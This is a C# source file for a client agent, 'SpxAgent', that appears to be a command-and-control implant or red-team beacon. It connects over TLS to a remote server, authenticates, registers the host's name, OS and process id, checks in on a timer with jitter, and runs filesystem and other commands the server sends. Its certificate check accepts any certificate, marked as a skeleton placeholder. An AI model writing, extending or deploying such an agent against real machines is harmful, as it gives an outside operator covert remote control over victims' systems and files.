using System.Net.Security;
using System.Net.Sockets;
using System.Text.Json;

namespace SpxAgent;

// SPX client: TLS connect -> AUTH -> REG(session or beacon) -> read loop.
// Session mode runs a single blocking read loop; the server pushes CMD frames.
// Beacon mode connects, sends a TASK check-in, reads the pending task batch,
// sends TASK_RES replies, and disconnects.
public sealed class SpxClient : IDisposable
{
    private readonly string _host;
    private readonly int _port;
    private readonly AgentIdentity _identity;
    private readonly TcpClient _tcp;
    private readonly SslStream _ssl;

    public string? SessionId { get; private set; }

    private SpxClient(string host, int port, AgentIdentity identity, TcpClient tcp, SslStream ssl)
    {
        _host = host;
        _port = port;
        _identity = identity;
        _tcp = tcp;
        _ssl = ssl;
    }

    public static async Task<SpxClient> ConnectAsync(string host, int port, AgentIdentity identity)
    {
        var tcp = new TcpClient();
        await tcp.ConnectAsync(host, port);
        var ssl = new SslStream(tcp.GetStream(), leaveInnerStreamOpen: false, userCertificateValidationCallback: ValidateServerCertificate);
        await ssl.AuthenticateAsClientAsync(new SslClientAuthenticationOptions
        {
            TargetHost = host,
            EnabledSslProtocols = System.Security.Authentication.SslProtocols.Tls12 | System.Security.Authentication.SslProtocols.Tls13,
        });
        return new SpxClient(host, port, identity, tcp, ssl);
    }

    // ValidateServerCertificate - TODO: pin the server certificate (or the
    // MtlsServerCA) here instead of accepting anything. The server certificate
    // is signed by the mTLS server CA; extract its PEM from the server and
    // validate the chain.
    private static bool ValidateServerCertificate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate? certificate,
        System.Security.Cryptography.X509Certificates.X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        return true; // SKELETON: accept-all. Replace with CA pinning.
    }

    // AuthenticateAsync - AUTH challenge-response.
    // Server sends {t:"AUTH", body:"<base64 nonce>"}; we reply with the Ed25519
    // signature over the nonce and await AUTH_OK.
    public async Task AuthenticateAsync()
    {
        var (challenge, _) = await Frame.ReadAsync(_ssl);
        if (challenge.T != "AUTH")
            throw new InvalidDataException($"expected AUTH challenge, got {challenge.T}");

        string nonceB64 = challenge.Body?.GetString() ?? throw new InvalidDataException("AUTH challenge missing nonce");
        byte[] nonce = Convert.FromBase64String(nonceB64);

        var authMsg = new Dictionary<string, string>
        {
            ["pubkey"] = _identity.PublicKeyHex,
            ["sig"] = _identity.SignBase64(nonce),
        };
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "AUTH",
            I = Frame.NewId(),
            R = challenge.I,
            TS = Frame.NowMillis(),
            M = JsonSerializer.SerializeToElement(authMsg),
        });

        var (resp, _) = await Frame.ReadAsync(_ssl);
        if (resp.T != "AUTH_OK")
            throw new InvalidDataException($"AUTH failed: {resp.E}");
    }

    // RegisterSessionAsync - REG (session mode, f=1). Returns the assigned session id.
    public async Task<string> RegisterSessionAsync()
    {
        var meta = BuildMetaDict();
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "REG",
            I = Frame.NewId(),
            C = 0x0001,           // spxOpRegister
            F = 0x01,             // spxHdrModeSession
            TS = Frame.NowMillis(),
            M = JsonSerializer.SerializeToElement(meta),
        });

        var (resp, _) = await Frame.ReadAsync(_ssl);
        if (resp.T != "REG_OK")
            throw new InvalidDataException($"REG failed: {resp.E}");
        SessionId = resp.S;
        return SessionId ?? throw new InvalidDataException("REG_OK missing session id");
    }

    public async Task<string> RegisterBeaconAsync(string beaconId, long intervalMs, long jitterMs)
    {
        var meta = BuildMetaDict();
        meta["interval"] = intervalMs;
        meta["jitter"] = jitterMs;
        meta["nextCheckin"] = Frame.NowMillis() + intervalMs;
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "REG",
            I = Frame.NewId(),
            C = 0x0001,
            F = 0x02,
            S = beaconId,
            TS = Frame.NowMillis(),
            M = JsonSerializer.SerializeToElement(meta),
        });

        var (resp, _) = await Frame.ReadAsync(_ssl);
        if (resp.T != "REG_OK")
            throw new InvalidDataException($"REG failed: {resp.E}");
        if (resp.S != beaconId)
            throw new InvalidDataException("REG_OK beacon id mismatch");
        return resp.S ?? throw new InvalidDataException("REG_OK missing beacon id");
    }

    public async Task RunAsync(CancellationToken ct = default)
    {
        while (!ct.IsCancellationRequested)
        {
            var (hdr, payload) = await Frame.ReadAsync(_ssl, ct);
            if (!await HandleServerFrameAsync(hdr, payload))
                break;
        }
    }

    // RunBeaconCheckinAsync - beacon mode single check-in: send TASK request,
    // read pending task batch, reply with TASK_RES, then return.
    // Returns true when the server ordered shutdown (KillReq).
    public async Task<bool> RunBeaconCheckinAsync(string beaconId, long intervalMs, long jitterMs, CancellationToken ct = default)
    {
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "TASK",
            I = Frame.NewId(),
            C = 0x0200,
            S = beaconId,
            TS = Frame.NowMillis(),
        });

        while (!ct.IsCancellationRequested)
        {
            using var readCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            readCts.CancelAfter(TimeSpan.FromSeconds(5));
            SpxHeader hdr;
            byte[] payload;
            try
            {
                (hdr, payload) = await Frame.ReadAsync(_ssl, readCts.Token);
            }
            catch (OperationCanceledException) when (!ct.IsCancellationRequested)
            {
                break;
            }

            if (!await HandleServerFrameAsync(hdr, payload, isTask: true, beaconId))
                return true; // KillReq
        }
        return false;
    }

    private static Dictionary<string, object> BuildMetaDict()
    {
        return new Dictionary<string, object>
        {
            ["name"] = "spx-csharp-agent",
            ["hostname"] = Environment.MachineName,
            ["os"] = "windows",
            ["arch"] = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant(),
            ["pid"] = Environment.ProcessId,
            ["version"] = "0.1-skeleton",
        };
    }

    private async Task<bool> HandleServerFrameAsync(SpxHeader hdr, byte[] payload, bool isTask = false, string? beaconId = null)
    {
        switch (hdr.T)
        {
            case "PING":
                await Frame.WriteAsync(_ssl, new SpxHeader
                {
                    V = 1,
                    T = "PONG",
                    R = hdr.I,
                    C = 0x0002,
                    TS = Frame.NowMillis(),
                });
                break;
            case "CMD":
            case "TASK":
                Console.WriteLine($"[+] {hdr.T} msg={hdr.Msg} id={hdr.I}");
                try
                {
                    var core = CoreCommands.Dispatch(hdr.Msg ?? "", hdr.Body);
                    if (core.Exit)
                        return false;

                    (string Msg, JsonElement Body)? res;
                    if (core.Msg is not null)
                    {
                        res = (core.Msg, core.Body ?? JsonSerializer.SerializeToElement(new Dictionary<string, object>()));
                    }
                    else
                    {
                        res = FsCommands.Dispatch(hdr.Msg ?? "", hdr.Body);
                    }

                    if (res is null && isTask && hdr.Msg != "KillReq")
                        res = (hdr.Msg!, JsonSerializer.SerializeToElement(new Dictionary<string, object>()));

                    if (res is not null)
                    {
                        await Frame.WriteAsync(_ssl, new SpxHeader
                        {
                            T = isTask ? "TASK_RES" : "RES",
                            R = hdr.I,
                            C = isTask ? 0x0201u : 0x0101u,
                            S = isTask ? beaconId : null,
                            TS = Frame.NowMillis(),
                            Msg = res.Value.Msg,
                            Body = res.Value.Body,
                        });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] command {hdr.Msg} failed: {ex.Message}");
                }
                break;
            case "DATA":
                Console.WriteLine($"[+] DATA stream k={hdr.K} len={payload.Length}");
                break;
            case "CLOSE":
                Console.WriteLine($"[+] CLOSE stream k={hdr.K}");
                break;
            case "ERR":
                Console.WriteLine($"[!] server ERR: {hdr.E}");
                break;
            default:
                Console.WriteLine($"[?] unhandled frame type {hdr.T}");
                break;
        }
        return true;
    }

    public void Dispose()
    {
        _ssl.Dispose();
        _tcp.Dispose();
    }
}
